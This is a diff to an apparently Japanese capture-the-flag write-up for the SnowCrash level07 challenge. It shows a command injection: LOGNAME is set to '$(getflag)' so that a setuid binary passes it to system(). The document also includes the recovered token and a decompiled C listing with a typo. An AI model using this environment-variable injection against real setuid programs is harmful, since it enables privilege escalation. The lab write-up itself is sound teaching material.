@@ -25,10 +25,32 @@ system("/bin/echo level07 "level07
 +++ exited (status 0) +++
 ```
 
-
+asprintfで作成した文字列をsystemで実行している
 
 ```sh
 level07@SnowCrash:~$ export LOGNAME="\$(getflag)"
 level07@SnowCrash:~$ ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
+
+## 補足
+
+```c
+void main(void)
+{
+  char *pcVar1;
+  char *local_1c;
+  __gid_t local_18;
+  __uid_t local_14;
+
+  local_18 = getegid();
+  local_14 = geteuid();
+  setresgid(local_18,local_18,local_18);
+  setresuid(local_14,local_14,local_14);
+  local_1c = (char *)0x0;
+  pcVar1 = getenv("LOGNAME");
+  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+  system(local_1c);
+  returun 0;
+}
 ```
